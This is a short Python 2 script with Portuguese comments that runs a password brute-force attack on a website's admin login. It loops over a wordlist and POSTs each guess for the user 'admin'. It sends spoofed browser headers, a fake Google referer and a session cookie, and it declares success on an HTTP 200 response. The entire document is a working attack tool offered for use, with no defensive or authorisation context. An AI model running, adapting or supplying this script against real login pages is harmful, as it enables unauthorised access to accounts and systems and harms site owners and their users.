#Web Brute Force
#V 2.0
#python2

import requests
import time

protocol = 'http://' #http:// or https://
site = 'www.site.com/admin/' #site destino
host = 'www.site.com' #site host
my_cookie = 'COOKIE_d77a34461ccb8217528b4120-1501106044-3600'   #cookies aqui

url = protocol + site
my_header = {'Host': host,
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Referer': 'https://www.google.com',
             'Cookie': my_cookie,
             'Connection': 'keep - alive',
             'Upgrade - Insecure - Requests': '1'}
try:
    file = open('wordlist.txt', 'r') #coloque o nome da wordlist ou o caminho
except Exception as err:
    print('error the open wordlist.')

for password in file:
    tentative = password.rstrip()

    #Esta variavel deve ser alterada conforme o formulario do site alvo.
    #como exemplo usando usuario admin
    my_data = {'user': 'admin',
               'password': tentative}
    print('Testing password...', tentative)
    try:
        my_request = requests.post(url,
                                   headers=my_header,
                                   data=my_data,
                                   allow_redirects=True)
    except Exception as erro:
        print('Error on request. Error Code: ', erro)
    time.sleep(1)
    if my_request.status_code == 200:
        print
        print'\033[32m' + 'Password found!: ' + tentative + '\033[0;0m'
        print('Status code web page: ', my_request.status_code)
        exit()

print
print'\033[31m' + 'Password not found.' + '\033[0;0m'
print
print'\033[31m' + 'Status code: ' + str(my_request.status_code) + '\033[0;0m'
file.close()
exit()